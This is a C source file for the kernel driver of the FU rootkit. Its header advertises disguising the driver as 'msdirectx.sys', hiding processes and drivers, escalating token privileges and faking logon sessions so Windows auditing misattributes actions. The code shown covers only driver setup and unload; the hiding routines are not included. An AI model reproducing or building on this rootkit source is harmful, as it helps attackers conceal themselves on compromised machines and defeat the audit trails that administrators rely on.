///////////////////////////////////////////////////////////////////////////////////////
// Filename Rootkit.c
// 
// Author: fuzen_op
// Email:  fuzen_op@yahoo.com or fuzen_op@rootkit.com
//
// Description: This driver does all the work of fu.exe. The driver is never unloaded 
//              until reboot. You can use whatever methods you like to load the driver 
//				such as SystemLoadAndCallImage suggested by Greg Hoglund. The driver 
//              is named msdirectx.sys. It is a play on Microsoft's DirectX and is named
//              this to help hide it. (A future tool will hide it completely!) The 
//              driver can change the groups and privileges on any process. It can also 
//              hide a process. Another feature is it can impersonate another logon 
//              session so that Windows Auditing etc. does not know what user really 
//              performed the actions you choose to take with the process. It does all 
//              this by Direct Kernel Object Manipulation (TM). No worries about do I have 
//              permission to that process, token, etc. If you can load a driver once, 
//              you are golden! NOW IT HIDES DRIVERS TOO!
//
// Date:    5/27/2003
// Version: 2.0
//
// Date     7/04/2003   Fixed a problem with a modified token not being inheritable.
//		   12/04/2003   Fixed problem with faking out the Windows Event Viewer.	
//						Cleaned up the code a lot! 
//		   12/05/2003   Now the driver walks the PsLoadedModuleList and removes references 
//                      to the device being hidden. Even after the device is hidden, a user 
//						land process can open a handle to it if its symbolic link name still 
//						exists. Obviously, a stealth driver would not want to create a or it 
//						could delete the symbolic link once it has initialized through the use
//						of an IOCTL.	

#include "ntddk.h"
#include "stdio.h"
#include "stdlib.h"

#include "file_and_sym.h"


const WCHAR deviceLinkBuffer[]  = L"\\DosDevices\\msdirectx";
const WCHAR deviceNameBuffer[]  = L"\\Device\\msdirectx";


//#define DEGUBPRINT
//#ifdef DEBUGPRINT
	#define   DebugPrint		DbgPrint
//#else
//	#define   DebugPrint
//#endif
   
NTSTATUS DriverEntry(
				   IN PDRIVER_OBJECT  DriverObject,
				   IN PUNICODE_STRING RegistryPath
					)
{
	
    NTSTATUS                ntStatus;
    UNICODE_STRING          deviceNameUnicodeString;
    UNICODE_STRING          deviceLinkUnicodeString;        

	DbgPrint("========> Rootkit loaded");

	// Setup our name and symbolic link. 
    RtlInitUnicodeString (&deviceNameUnicodeString,
                          deviceNameBuffer );
    RtlInitUnicodeString (&deviceLinkUnicodeString,
                          deviceLinkBuffer );

    // Set up the device
    ntStatus = IoCreateDevice ( DriverObject,
                                0, // For driver extension
                                &deviceNameUnicodeString,
                                //FILE_DEVICE_ROOTKIT, //defined in ioCTL.h #define FILE_DEVICE_ROOTKIT 0x00002a7b
								0x00002a7b,
                                0,
                                TRUE,
                                &g_RootkitDevice );
	
    if(! NT_SUCCESS(ntStatus))
	{
        DebugPrint(("Failed to create device!\n"));
        return ntStatus;
    }
 
		
	ntStatus = IoCreateSymbolicLink (&deviceLinkUnicodeString,
                                        &deviceNameUnicodeString );
    if(! NT_SUCCESS(ntStatus)) 
	{
		IoDeleteDevice(DriverObject->DeviceObject);
        DebugPrint("Failed to create symbolic link!\n");
        return ntStatus;
    }

	/*
    // Create dispatch points for all routines that must be handled
    DriverObject->MajorFunction[IRP_MJ_SHUTDOWN]        =
    DriverObject->MajorFunction[IRP_MJ_CREATE]          =
    DriverObject->MajorFunction[IRP_MJ_CLOSE]           =
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]  = RootkitDispatch;
	*/
	
	// Its extremely unsafe to unload a system-call hooker.
	// Use GREAT caution.
    DriverObject->DriverUnload                          = RootkitUnload;
   
   
    return STATUS_SUCCESS;
}


NTSTATUS RootkitUnload(IN PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING          deviceLinkUnicodeString;
	PDEVICE_OBJECT			p_NextObj;

	p_NextObj = DriverObject->DeviceObject;

	if (p_NextObj != NULL)
	{
        // Delete the symbolic link for our device
		//
		RtlInitUnicodeString( &deviceLinkUnicodeString, deviceLinkBuffer );
		IoDeleteSymbolicLink( &deviceLinkUnicodeString );
		// Delete the device object
		//
		IoDeleteDevice( DriverObject->DeviceObject );
		
		
		DbgPrint("========> Rootkit unloaded");
		return STATUS_SUCCESS;
	}
	
	
	DbgPrint("========> Rootkit unloaded");
	return STATUS_SUCCESS;
}


